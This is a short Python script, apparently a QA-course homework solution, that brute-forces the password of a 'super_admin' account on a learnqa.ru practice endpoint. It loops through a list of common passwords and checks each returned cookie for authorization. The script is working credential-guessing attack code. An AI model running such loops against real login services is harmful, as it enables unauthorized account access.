import requests
import json

login = "super_admin"
passwords_list = ['password', '123456', '123456789', '12345678', '12345', 'qwerty', 'abc123', 'football', 'monkey', '111111', 'letmein', '1234', '1234567890', 'dragon', 'baseball', '1234567', 'sunshine', 'iloveyou', 'trustno1', 'princess', 'adobe123', '123123', 'welcome', 'login', 'admin', 'abc123', 'qwerty123', 'solo', '1q2w3e4r', 'master', '666666', 'photoshop', '1qaz2wsx', 'qwertyuiop', 'ashley', 'mustang', '121212', 'starwars', '654321', 'bailey', 'access', 'master', 'flower', '555555', 'passw0rd', 'shadow', 'lovely', '7777777', 'michael', '!@#$%^&*', 'password1', 'superman', 'hello', 'charlie', '888888', '696969', 'hottie', 'freedom', 'aa123456', 'qazwsx', 'ninja', 'azerty', 'loveme', 'whatever', 'donald', 'batman', 'zaq1zaq1', 'Football', '000000', '123qwe']

for i in passwords_list:
    data1 = {"login": login, "password": i}
    get_secret_password = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = data1)
    get_secret_password_headers = get_secret_password.headers
    cookie = get_secret_password_headers['Set-Cookie']
    headers = {"cookie": cookie}
    check_auth_cookie = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", headers = headers)
    if check_auth_cookie.text != 'You are NOT authorized':
        print(check_auth_cookie.text, "Password =", i)

